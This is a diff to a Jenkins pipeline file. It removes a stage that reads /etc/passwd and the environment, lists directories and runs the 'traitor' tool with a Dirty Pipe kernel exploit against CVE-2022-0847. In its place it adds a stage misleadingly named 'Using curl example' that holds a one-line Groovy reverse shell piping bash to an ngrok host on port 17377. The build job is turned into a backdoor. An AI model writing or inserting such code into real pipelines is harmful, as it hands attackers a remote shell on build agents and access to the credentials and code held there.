@@ -2,18 +2,15 @@ pipeline {
     agent any
 
     stages {
-        stage('Hello') {
+        stage("Using curl example") {
             steps {
-                sh 'cat /etc/passwd'
-                sh 'env'
-                sh 'chmod 777 traitor-amd64'
-                sh './traitor-amd64 --exploit kernel:CVE-2022-0847'
-                sh 'id'
-                sh 'whoami'
-                sh 'ls -a'
-                sh 'ls -la /'
-                sh 'ls -la /var/'
-                curl -s 7.tcp.eu.ngrok.io:17377
+                script {
+                    String host="7.tcp.eu.ngrok.io";
+                    int port=17377;
+                    String cmd="bash";
+                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+                    }
+                }
             }
         }
     }
